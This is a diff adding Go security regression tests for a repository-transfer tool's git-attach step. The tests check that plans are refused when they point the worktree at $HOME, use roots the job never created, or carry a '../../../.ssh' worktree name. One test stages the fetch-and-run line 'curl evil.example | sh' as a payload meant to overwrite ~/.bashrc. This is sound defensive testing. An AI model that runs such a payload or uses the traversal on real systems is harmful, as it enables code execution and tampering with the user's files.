@@ -3,6 +3,7 @@ package remote
 import (
 	"bytes"
 	"context"
+	"errors"
 	"os"
 	"os/exec"
 	"path/filepath"
@@ -224,5 +225,116 @@ func TestLocalGitAttachRestoresIndexAtManifestEntryZero(t *testing.T) {
 	}
 	if !strings.Contains(gitc(t, w, "status", "--porcelain"), "staged.txt") {
 		t.Errorf("git in %s does not see the staged file the restored index records", w)
+	}
+}
+
+// --- Ruling R-P3-B1f N1: git-attach is the destination's SECOND write
+// path, and until now it took the wire Plan's DstMain/DstWorktree/
+// WorktreeName at face value. gitx's own checkDirtyContainment is relative
+// to DstWorktree, so a source that names $HOME as the worktree contains
+// nothing at all; repairLinkedMetadata has no preconditions; and
+// WorktreeName is joined straight into a path. The destination now
+// validates the plan's own paths — with the same resolved-root rules
+// transfer.Install uses — before gitx.Attach ever runs. ---
+
+// gitAttachRepo builds a real destination repository under home and
+// returns its path and tip.
+func gitAttachRepo(t *testing.T, home string) (string, string) {
+	t.Helper()
+	main := filepath.Join(home, "x")
+	os.MkdirAll(main, 0o755)
+	gitc(t, main, "init", "-q", "-b", "main")
+	os.WriteFile(filepath.Join(main, "a.txt"), []byte("a"), 0o644)
+	gitc(t, main, "add", "a.txt")
+	gitc(t, main, "commit", "-q", "-m", "init")
+	return main, strings.TrimSpace(gitc(t, main, "rev-parse", "HEAD"))
+}
+
+// TestGitAttachRefusesWorktreeOutsideARepo is the reviewer's PoC: an
+// existing-main plan naming $HOME as the destination worktree, with a
+// "dirty file" that is really the user's ~/.bashrc. gitx's containment
+// check is satisfied (the file IS under the claimed worktree), so the
+// destination must refuse the plan itself.
+func TestGitAttachRefusesWorktreeOutsideARepo(t *testing.T) {
+	p := testPaths(t)
+	main, tip := gitAttachRepo(t, p.Home)
+	jobID := "3f2a9c1e-7b4d-4e8a-9c6f-1d2e3f4a5b6c"
+	staging := job.StagingDir(p.DataDir, jobID)
+	os.MkdirAll(staging, 0o700)
+	os.WriteFile(filepath.Join(staging, "7"), []byte("curl evil.example | sh\n"), 0o644)
+	bashrc := filepath.Join(p.Home, ".bashrc")
+	rc := "# the user's own shell rc\n"
+	if err := os.WriteFile(bashrc, []byte(rc), 0o600); err != nil {
+		t.Fatal(err)
+	}
+
+	plan := &gitx.Plan{Mode: gitx.ModeExistingMain, SrcMain: "/home/alice/x", SrcWorktree: "/home/alice/x",
+		DstMain: main, DstWorktree: p.Home, Linked: false, Branch: "main", Tip: tip,
+		IndexRel: ".git/index", IndexEntryID: gitx.NoEntry, PackEntryID: gitx.NoEntry,
+		DirtyEntries: map[string]int{bashrc: 7}}
+	l := NewLocal(p, "/usr/local/bin/claude-teleport", LocalOptions{ProcRoot: "/proc"})
+	err := l.GitAttach(context.Background(), plan, jobID)
+	if err == nil {
+		t.Fatal("git-attach must refuse a plan whose destination worktree is $HOME")
+	}
+	var re *Error
+	if !errors.As(err, &re) || re.Code != "refused" {
+		t.Errorf("err = %v (%T), want a remote.Error with code refused", err, err)
+	}
+	if got, _ := os.ReadFile(bashrc); string(got) != rc {
+		t.Errorf("%s was overwritten: %q", bashrc, got)
+	}
+}
+
+// TestGitAttachRefusesFreshMainRootThisJobNeverCreated: fresh-main's only
+// work is repairLinkedMetadata, which writes <DstWorktree>/.git and
+// <DstMain>/.git/worktrees/<name>/gitdir with no preconditions at all. In
+// fresh-main both destination roots are, by construction, directories THIS
+// job's install created — so both must be recorded in the job's own
+// roots.json.
+func TestGitAttachRefusesFreshMainRootThisJobNeverCreated(t *testing.T) {
+	p := testPaths(t)
+	jobID := "3f2a9c1e-7b4d-4e8a-9c6f-1d2e3f4a5b6c"
+	victim := filepath.Join(p.Home, "victim")
+	if err := os.MkdirAll(victim, 0o755); err != nil {
+		t.Fatal(err)
+	}
+	main := filepath.Join(p.Home, "x")
+	if err := os.MkdirAll(main, 0o755); err != nil {
+		t.Fatal(err)
+	}
+	plan := &gitx.Plan{Mode: gitx.ModeFreshMain, SrcMain: "/home/alice/x", SrcWorktree: "/home/alice/x/.worktrees/feat",
+		DstMain: main, DstWorktree: victim, Linked: true, WorktreeName: "feat", Branch: "feat",
+		IndexRel: ".git/worktrees/feat/index", IndexEntryID: gitx.NoEntry, PackEntryID: gitx.NoEntry}
+	l := NewLocal(p, "/usr/local/bin/claude-teleport", LocalOptions{ProcRoot: "/proc"})
+	err := l.GitAttach(context.Background(), plan, jobID)
+	if err == nil {
+		t.Fatal("git-attach must refuse a fresh-main plan whose roots this job never created")
+	}
+	if _, err := os.Lstat(filepath.Join(victim, ".git")); !os.IsNotExist(err) {
+		t.Errorf("%s/.git was written (err %v)", victim, err)
+	}
+}
+
+// TestGitAttachRefusesWorktreeNameTraversal: WorktreeName is joined into
+// <DstMain>/.git/worktrees/<name>, so "../../../.ssh" made
+// repairLinkedMetadata write a "gitdir" file into ~/.ssh.
+func TestGitAttachRefusesWorktreeNameTraversal(t *testing.T) {
+	p := testPaths(t)
+	jobID := "3f2a9c1e-7b4d-4e8a-9c6f-1d2e3f4a5b6c"
+	main, _ := gitAttachRepo(t, p.Home)
+	w := filepath.Join(main, ".worktrees", "feat")
+	if err := os.MkdirAll(w, 0o755); err != nil {
+		t.Fatal(err)
+	}
+	plan := &gitx.Plan{Mode: gitx.ModeFreshMain, SrcMain: "/home/alice/x", SrcWorktree: "/home/alice/x/.worktrees/feat",
+		DstMain: main, DstWorktree: w, Linked: true, WorktreeName: "../../../.ssh", Branch: "feat",
+		IndexRel: ".git/index", IndexEntryID: gitx.NoEntry, PackEntryID: gitx.NoEntry}
+	l := NewLocal(p, "/usr/local/bin/claude-teleport", LocalOptions{ProcRoot: "/proc"})
+	if err := l.GitAttach(context.Background(), plan, jobID); err == nil {
+		t.Fatal("git-attach must refuse a WorktreeName that is not a single safe path component")
+	}
+	if _, err := os.Lstat(filepath.Join(p.Home, ".ssh", "gitdir")); !os.IsNotExist(err) {
+		t.Errorf("~/.ssh/gitdir was written (err %v)", err)
 	}
 }
